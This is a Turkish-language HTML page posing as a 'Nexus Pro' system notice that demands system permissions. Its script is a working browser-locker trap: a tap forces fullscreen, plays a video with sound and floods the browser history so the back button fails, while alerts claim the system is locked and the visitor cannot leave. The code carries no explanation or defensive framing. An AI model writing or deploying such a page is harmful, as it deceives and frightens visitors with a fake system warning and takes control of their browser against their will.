<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Nexus Pro - Sistem Bildirimi</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            user-select: none;
            -webkit-user-select: none;
        }
        body, html {
            width: 100%;
            height: 100%;
            background-color: #000;
            overflow: hidden;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: sans-serif;
        }
        video {
            width: 100vw;
            height: 100vh;
            object-fit: cover;
            position: absolute;
            top: 0;
            left: 0;
            z-index: 1;
        }
        #overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.95);
            color: #ff0000;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 10;
            text-align: center;
            padding: 20px;
        }
        #overlay h1 {
            font-size: 24px;
            margin-bottom: 15px;
            text-transform: uppercase;
        }
    </style>
</head>
<body onclick="forceFullscreen()">

    <div id="overlay" onclick="startTrap()">
        <h1>⚠️ SİSTEM İZNLERİ GEREKLİ ⚠️</h1>
        <p style="color: #fff;">Devam etmek için ekrana dokunun.</p>
    </div>

    <video id="myVideo" playsinline loop src="SnapTik.Net_7627468591947926792.mp4"></video>

    <script>
        function lockHistory() {
            for (let i = 0; i < 50; i++) {
                window.history.pushState(null, "", window.location.href);
            }
        }

        window.onpopstate = function() {
            window.history.pushState(null, "", window.location.href);
            alert("⚠️ SİSTEM KİLİTLENDİ!");
            alert("⚠️ SAYFADAN AYRILAMAZSINIZ!");
            forceFullscreen();
        };

        function forceFullscreen() {
            const doc = document.documentElement;
            if (doc.requestFullscreen) {
                doc.requestFullscreen();
            } else if (doc.webkitRequestFullscreen) {
                doc.webkitRequestFullscreen();
            }
        }

        function startTrap() {
            document.getElementById("overlay").style.display = "none";
            const video = document.getElementById("myVideo");
            video.muted = false;
            video.play();
            forceFullscreen();
            lockHistory();
        }

        window.onload = function() {
            lockHistory();
        };
    </script>
</body>
</html>
